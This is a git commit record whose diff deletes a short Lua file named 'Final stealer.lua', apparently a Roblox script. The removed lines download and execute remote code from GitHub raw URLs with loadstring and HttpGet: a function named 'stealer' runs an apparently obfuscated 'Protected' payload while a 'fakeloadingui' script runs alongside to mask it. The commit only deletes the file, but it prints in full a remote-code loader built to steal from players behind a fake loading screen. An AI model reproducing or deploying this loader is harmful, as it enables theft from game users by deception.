10ceec2de9738c5a8493c59465af4be8c7ced24a
ScriptkingPt <erclone131@gmail.com>
2025-05-26 02:34:08 +0800

    Delete Final stealer.lua

--- Final stealer.lua
+++
@@ -1,9 +0,0 @@
-local function stealer()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptkingPt/Gag-script/refs/heads/main/Protected_5702196561115891.lua.txt'))()
-end
-local function loadui()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptkingPt/Gag-script/refs/heads/main/fakeloadingui.lua'))()
-end
-
-task.spawn(stealer)
-task.spawn(loadui)
